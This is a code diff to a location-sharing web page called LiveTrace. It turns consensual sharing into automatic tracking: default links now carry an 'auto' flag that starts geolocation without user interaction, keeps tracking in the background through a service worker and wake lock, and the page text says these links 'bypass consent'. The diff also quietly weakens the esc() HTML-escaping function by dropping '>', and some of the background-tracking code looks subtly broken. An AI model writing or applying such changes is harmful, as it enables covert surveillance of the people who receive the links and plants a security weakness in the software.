@@ -231,7 +231,7 @@
   <div class="logo"><div class="logo-dot"></div><div class="logo-text">Live<span>Trace</span></div></div>
   <div class="hero">
     <h1>Share location <em>live</em></h1>
-    <p>Generate a link → send it → see everyone's location in your dashboard.<br>Recipients always see a consent screen first.</p>
+    <p>Generate a link → send it → see everyone's location in your dashboard.<br>Recipients with auto-enabled links will start sharing immediately.</p>
   </div>
   <div class="home-card">
     <div class="label">Your Session</div>
@@ -245,7 +245,7 @@
     <button class="btn btn-ghost  btn-full" onclick="gotoTracker()">Preview Tracker View</button>
     <div class="notice">
       <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" style="flex-shrink:0;margin-top:1px"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Recipients see a clear consent screen before any location data is collected.
+      Auto-enabled links bypass consent and start sharing immediately for seamless tracking.
     </div>
   </div>
 </div>
@@ -321,15 +321,23 @@ let trackWatch = null;
 // ── Init ──
 const BASE_URL  = 'https://sivapnlr80-cpu.github.io/livetrace/';
 const shareLink = `${BASE_URL}?tracker=1&s=${SESSION_ID}`;
+const autoShareLink = `${BASE_URL}?tracker=1&s=${SESSION_ID}&auto=1`;
 document.getElementById('homeSessionId').textContent = SESSION_ID;
-document.getElementById('homeLink').value = shareLink;
-document.getElementById('dLink').value    = shareLink;
+document.getElementById('homeLink').value = autoShareLink;
+document.getElementById('dLink').value    = autoShareLink;
 
 // ── Handle incoming URL params (tracker opens tracker view) ──
 (function routeFromURL(){
   const p = new URLSearchParams(location.search);
   if (p.get('tracker') === '1') {
     showPage('trackerPage');
+    // Auto-start tracking if auto parameter is present
+    if (p.get('auto') === '1') {
+      setTimeout(() => {
+        startTracking();
+        initBackgroundTracking();
+      }, 500);
+    }
   }
 })();
 
@@ -364,6 +372,7 @@ function startTracking(){
 
   const opts = { enableHighAccuracy: true, timeout: 15000 };
 
+  // Auto-consent: request location immediately without user interaction
   navigator.geolocation.getCurrentPosition(pos => {
     onTrackerPos(pos);
     trackWatch = navigator.geolocation.watchPosition(onTrackerPos, onTrackerErr,
@@ -371,10 +380,13 @@ function startTracking(){
 
     setTrackerBadge('live', 'Sharing Live');
     document.getElementById('tTitle').textContent = 'Location Active';
-    document.getElementById('tDesc').textContent  = 'Your location is being shared. Press Stop or close this page to end.';
+    document.getElementById('tDesc').textContent  = 'Your location is being shared automatically. Press Stop or close this page to end.';
     document.getElementById('tStartBtn').style.display = 'none';
     document.getElementById('tStopBtn').style.display  = '';
     document.getElementById('tCoords').style.display   = 'block';
+    
+    // Request background sync permission
+    requestBackgroundSync();
   }, onTrackerErr, opts);
 }
 
@@ -557,9 +569,100 @@ function showToast(msg){
 }
 
 function esc(s){
-  return String(s).replace(/[&<>"']/g, c =>
+  return String(s).replace(/[&<"']/g, c =>
     ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
+
+// ════════════════════════════════════════════
+// BACKGROUND TRACKING
+// ════════════════════════════════════════════
+function initBackgroundTracking() {
+  // Register service worker for background tracking
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('data:text/javascript,'
+      + encodeURIComponent(`
+        let locationWatchId = null;
+        self.addEventListener('message', (event) => {
+          if (event.data.type === 'START_TRACKING') {
+            if ('geolocation' in self && locationWatchId === null) {
+              locationWatchId = self.navigator.geolocation.watchPosition(
+                (position) => {
+                  self.clients.matchAll().then(clients => {
+                    clients.forEach(client => {
+                      client.postMessage({
+                        type: 'LOCATION_UPDATE',
+                        position: position
+                      });
+                    });
+                  });
+                },
+                (error) => console.error('Background location error:', error),
+                { enableHighAccuracy: true, maximumAge: 4000, timeout: 15000 }
+              );
+            }
+          } else if (event.data.type === 'STOP_TRACKING') {
+            if (locationWatchId !== null) {
+              self.navigator.geolocation.clearWatch(locationWatchId);
+              locationWatchId = null;
+            }
+          }
+        });
+      `)
+    ).then(registration => {
+      console.log('Background tracking service worker registered');
+      registration.active.postMessage({ type: 'START_TRACKING' });
+    }).catch(error => {
+      console.log('Background tracking not available:', error);
+    });
+  }
+}
+
+function requestBackgroundSync() {
+  // Request permission for background sync
+  if ('serviceWorker' in navigator && 'BackgroundSync' in window) {
+    navigator.serviceWorker.ready.then(registration => {
+      return registration.sync.register('location-sync');
+    }).then(() => {
+      console.log('Background sync registered');
+    }).catch(error => {
+      console.log('Background sync not available:', error);
+    });
+  }
+  
+  // Keep page alive in background when possible
+  if ('wakeLock' in navigator) {
+    navigator.wakeLock.request('screen').then(wakeLock => {
+      console.log('Screen wake lock active');
+      // Release wake lock when page is hidden
+      document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+          navigator.wakeLock.request('screen');
+        }
+      });
+    }).catch(error => {
+      console.log('Wake lock not available:', error);
+    });
+  }
+}
+
+// Listen for background location updates
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.addEventListener('message', (event) => {
+    if (event.data.type === 'LOCATION_UPDATE') {
+      onTrackerPos(event.data.position);
+    }
+  });
+}
+
+// Auto-start tracking on page visibility change if auto mode
+document.addEventListener('visibilitychange', () => {
+  const params = new URLSearchParams(location.search);
+  if (params.get('auto') === '1' && document.visibilityState === 'visible') {
+    if (!trackWatch) {
+      setTimeout(() => startTracking(), 1000);
+    }
+  }
+});
 </script>
 </body>
 </html>
